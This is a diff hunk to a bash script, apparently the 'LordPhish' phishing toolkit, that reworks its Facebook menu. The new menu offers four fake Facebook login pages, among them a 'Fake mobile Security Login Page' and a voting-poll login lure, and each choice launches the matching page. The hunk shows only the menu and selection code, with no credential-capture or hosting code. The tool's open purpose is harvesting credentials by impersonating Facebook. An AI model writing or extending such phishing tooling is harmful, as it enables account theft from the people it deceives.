@@ -321,65 +321,42 @@ printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illeg
 printf "\n"
 }
 
-list_fb() {
-    clear
-    banner
-    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook desktop\e[0m\n"
-    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook mobile\e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' list_fb
-if [[ $option == 1 ]]; then
-l_fbdesk
+facebook(){
+clear
+banner
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake mobile Security Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Mobile Login Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
 
-if [[ $option == 2 ]]; then
-l_fbmob
+if [[ $fb_option == 1 || $fb_option == 01 ]]; then
+website="face_desk"
+start
+
+elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
+website="face_deskStat"
+start
+
+elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
+website="face_mobSec"
+start
+
+elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
+website="face_moobileP"
+start
 
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+clear
 menu
 fi
+
 }
 
-l_fbdesk() {
- clear
- banner
- printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook page\e[0m\n"
- printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Statisc\e[0m\n"
- read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' l_fbdesk
- 
-if [[ $option == 1 ]]; then
-server="face_desk"
-start
-    
-elif [[ $option == 2 ]]; then
-server="face_deskStat"
-start
- 
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-menu
-fi
-}
-
-l_fbmob() {
- clear
- banner
- printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Page\e[0m\n"
- printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Facebook Security Page\e[0m\n"
- read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' l_fbmob
- 
-if [[ $option == 1 ]]; then
-server="face_moobileP"
-start
-    
-elif [[ $option == 2 ]]; then
-server="face_mobSec"
-start
- 
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-menu
-fi
-}
 
 list_g() {
     clear
